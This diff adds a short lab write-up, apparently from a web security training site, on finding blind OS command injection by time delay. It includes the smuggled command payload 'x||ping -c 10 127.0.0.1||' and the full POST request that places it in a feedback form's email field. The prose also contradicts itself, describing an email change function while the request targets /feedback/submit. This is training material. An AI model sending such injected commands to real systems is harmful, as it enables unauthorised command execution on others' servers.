@@ -1,0 +1,25 @@
+Blind OS command injection with time delays
+
+Once again, we look for POST requests, as there are generally more prone to exploits.
+There's a POST request in the email change function. Send it to repeater.
+
+Testing all the parameters with this payload:
+x||ping+-c+10+127.0.0.1||
+
+we can see that only the email parameter actually took 10 seconds to respond, thus proving there is a blind OS injection.
+
+Request:
+POST /feedback/submit HTTP/1.1
+Host: ac221ffe1e69d8f9800159be008f0069.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 105
+Origin: https://ac221ffe1e69d8f9800159be008f0069.web-security-academy.net
+Connection: close
+Referer: https://ac221ffe1e69d8f9800159be008f0069.web-security-academy.net/feedback
+Cookie: session=Cxk28DySoVSR6wFRBNZrfJeRAYWkdxYM
+
+csrf=ZJ8DXKBRnNjllRvZd9NR5EiPUjxiGJu5&name=asdf&email=x||ping+-c+10+127.0.0.1||&subject=asdf&message=asdf
